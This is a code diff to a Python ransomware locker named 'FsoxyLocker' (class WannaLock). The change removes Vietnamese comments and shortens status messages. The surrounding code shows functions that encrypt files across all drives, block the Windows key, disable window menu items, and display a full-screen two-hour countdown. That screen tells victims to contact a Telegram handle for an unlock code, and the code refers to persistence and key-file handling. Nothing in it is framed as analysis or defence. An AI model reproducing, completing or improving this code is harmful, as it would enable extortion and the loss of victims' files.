@@ -112,9 +112,9 @@ def encrypt_files_in_all_drives():
                                 encrypted_files_count += 1
                         except Exception as e:
                             print(f"[!] Bỏ qua file {file_path}: {e}")
-        print("[+] Hoàn tất quá trình mã hóa toàn máy.")
+        print("[+] done.")
     except Exception as e:
-        print(f"[!] Lỗi tiến trình quét toàn máy: {e}")
+        print(f"[!] error: {e}")
     finally:
         encryption_finished = True
 
@@ -147,9 +147,9 @@ def decrypt_files_in_all_drives():
                                 os.remove(file_path)
                         except Exception as e:
                             print(f"[!] Lỗi giải mã file {file_path}: {e}")
-        print("[+] Hoàn tất quá trình giải mã toàn máy.")
+        print("[+] done.")
     except Exception as e:
-        print(f"[!] Lỗi tiến trình giải mã toàn máy: {e}")
+        print(f"[!] error: {e}")
 
 try:
     keyboard.block_key("windows")
@@ -178,8 +178,8 @@ def setup_window_buttons(root):
             
         hMenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
         if hMenu:
-            ctypes.windll.user32.EnableMenuItem(hMenu, 0xF060, 0x00000000 | 0x00000001) # Enable 'Lock' menu item
-            ctypes.windll.user32.EnableMenuItem(hMenu, 0xF030, 0x00000000 | 0x00000001) # Enable 'Minimize' menu item
+            ctypes.windll.user32.EnableMenuItem(hMenu, 0xF060, 0x00000000 | 0x00000001) 
+            ctypes.windll.user32.EnableMenuItem(hMenu, 0xF030, 0x00000000 | 0x00000001) 
     except Exception:
         pass
 
@@ -187,7 +187,7 @@ class WannaLock:
     def __init__(self, root):
         self.root = root
         self.total_time = 7200
-        self.time_left = 7200  # <--- Biến đếm thời gian (dùng như bộ đếm)
+        self.time_left = 7200  
         
         self.root.title("FsoxyLocker - your files have been locked")
         self.root.attributes("-fullscreen", True)
@@ -204,44 +204,34 @@ class WannaLock:
         self.update_timer()
 
     def create_widgets(self):
-        # Tiêu đề chính (Đã được căn giữa nhờ anchor="center")
         lbl_title = tk.Label(self.root, text="oops!your files have been locked",  
                              fg="#dc143c", bg="#000000", font=("Consolas", 40, "bold"), cursor="none")
-        # TĂNG pady trên (90 -> 120) để đẩy tiêu đề xuống sâu hơn một chút
         lbl_title.pack(anchor="center", padx=60, pady=(120, 75))
-
-        # Ảnh (Được pack trực tiếp vào root)
+       
         image_path = resource_path("pic.bmp")
         if os.path.exists(image_path):
             img_pil = Image.open(image_path)
             img_pil = img_pil.resize((300,300), Image.Resampling.LANCZOS)
             self.img_tk = ImageTk.PhotoImage(img_pil)
             lbl_img = tk.Label(self.root, image=self.img_tk, bg="#000000", cursor="none")
-            lbl_img.pack(pady=(20, 15)) # Padding: 20 trên, 15 dưới
+            lbl_img.pack(pady=(20, 15)) 
 
-        # Đồng hồ đếm ngược (Được pack trực tiếp vào root)
         self.lbl_timer = tk.Label(self.root, text="", fg="#dc143c", bg="#000000", font=("Consolas", 35, "bold"), cursor="none")
-        self.lbl_timer.pack(pady=5) # Padding: 5
+        self.lbl_timer.pack(pady=5) 
 
-        # Thanh tiến trình (Được pack trực tiếp vào root)
         self.canvas_width = 600
         self.canvas_height = 30
         self.progress_canvas = tk.Canvas(self.root, width=self.canvas_width, height=self.canvas_height, 
                                          bg="#000000", highlightthickness=1, highlightbackground="#646464", cursor="none")
-        self.progress_canvas.pack(pady=(8, 5)) # Padding: 8 trên, 5 dưới
+        self.progress_canvas.pack(pady=(8, 5))
         self.progress_rect = self.progress_canvas.create_rectangle(2, 2, self.canvas_width-2, self.canvas_height-2, fill="#dc143c", outline="")
 
-        # Số lượng file đã mã hóa (Được pack trực tiếp vào root)
         self.lbl_file_count = tk.Label(self.root, text="encrypted files: 0", fg="#dc143c", bg="#000000", font=("Consolas", 14, "bold"), cursor="none")
-        self.lbl_file_count.pack(pady=(0, 8)) # Padding: 0 trên, 8 dưới
+        self.lbl_file_count.pack(pady=(0, 8)) 
 
-        # Hướng dẫn (Được pack trực tiếp vào root)
         lbl_instruction = tk.Label(self.root, text="contact telegram:@L1NUX_1987 to get the unlock code", 
                                    fg="#c8c8c8", bg="#000000", font=("Consolas", 20), cursor="none")
-        # TĂNG pady trên (10 -> 30) để đẩy nó xuống sâu hơn
-        lbl_instruction.pack(pady=(30, 25)) # Padding: 30 trên, 25 dưới
-
-        # Khung nhập liệu (Được pack trực tiếp vào root)
+        lbl_instruction.pack(pady=(30, 25))
         frame_input = tk.Frame(self.root, bg="#0f0f0f", cursor="none")
         frame_input.pack()
 
@@ -255,8 +245,7 @@ class WannaLock:
         btn_unlock.pack(side=tk.LEFT, padx=5)
 
         self.lbl_status = tk.Label(self.root, text="", fg="#dc143c", bg="#0f0f0f", font=("Consolas", 16, "bold"), cursor="none")
-        # Padding cho trạng thái (để nó nằm ngay dưới ô nhập liệu)
-        self.lbl_status.pack(pady=(5, 20)) # Giữ nguyên padding này
+        self.lbl_status.pack(pady=(5, 20))
 
 
     def update_timer(self):
@@ -294,7 +283,7 @@ class WannaLock:
 
     def _run_decryption(self):
         decrypt_files_in_all_drives()
-        # restore_desktop_background() # Hàm này không được định nghĩa, giữ nguyên comment
+        # restore_desktop_background()
         remove_persistence()
         remove_key_file()
         self.root.after(1000, self.quit_app)
